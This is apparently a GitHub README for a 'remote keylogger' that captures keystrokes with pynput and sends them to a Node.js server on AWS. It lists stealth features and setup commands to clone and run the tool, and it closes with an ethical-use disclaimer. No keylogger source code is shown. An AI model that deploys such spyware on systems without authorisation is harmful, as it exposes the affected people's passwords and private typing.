# Remote Keylogger

## 📌 Introduction
This project is a *remote keylogger* designed for *security monitoring and penetration testing. It captures keystrokes from a target system and transmits the data securely to a remote server for real-time monitoring. The project ensures ethical implementation with security measures such as **AES encryption* and *access controls*.

## ⚡ Features
- ✅ *Real-time Keystroke Logging* – Captures and logs all keystrokes accurately.
- ✅ *Remote Logging* – Sends keystroke data to a remote server for monitoring.
- ✅ *Low Latency* – Processes logs within *0.5 seconds* for instant updates.
- ✅ *Minimal System Resource Consumption* – Runs in the background without affecting performance.
- ✅ *Security Measures* – Implements *AES encryption* and *access control*.

## 🛠 Requirements
### *Hardware Requirements*
- Laptop/Desktop with *Windows or Linux OS*
- Stable *internet connection* for data transmission
- *AWS EC2 Instance* for remote logging

### *Software Requirements*
- *Python* (for keylogger development)
- *Node.js* (for server-side logging)
- *pynput* (for keystroke capture)
- *Express.js* (to handle logs on the server)

## 🚀 Setup Instructions
### *Step 1: Set Up the Keylogger*
1. Clone this repository:
   sh
   git clone https://github.com/bhargav-12ab/keylogger-project.git
   cd keylogger-project
   
2. Create a virtual environment:
   sh
   python -m venv keylogger_env
   source keylogger_env/bin/activate  # For Linux/macOS
   keylogger_env\Scripts\activate  # For Windows
   
3. Install required dependencies:
   sh
   pip install -r requirements.txt
   
4. Run the keylogger script:
   sh
   python keylogger.py
   

### *Step 2: Set Up the Remote Server*
1. Deploy a *Node.js server* on an cloud server
   sh
   node server.js
   
2. Open the browser and access keystrokes from:
   sh
   http://{server-ip}:8080
   
   
## 📊 Performance Analysis
- *99.9% keystroke accuracy* achieved.
- *Log processing time:* Less than *0.5 seconds*.
- *Minimal CPU & RAM usage* for stealth operations.

## 🔐 Security Measures Implemented
- *AES Encryption* for log files.
- *Access Control* to prevent unauthorized access.
- *Ethical Guidelines* enforced to ensure responsible use.

## 🔮 Future Enhancements
- 🔹 *AI-based anomaly detection* to prevent misuse.
- 🔹 *GUI-based monitoring dashboard* for better usability.
- 🔹 *Mobile device compatibility* for broader security analysis.
- 🔹 *Advanced stealth features* for cybersecurity research.

## ⚠ Disclaimer
*This project is intended for educational and ethical cybersecurity research purposes only.* Unauthorized use of keyloggers for malicious activities is illegal and punishable under various laws. Use this tool responsibly and only with proper authorization.
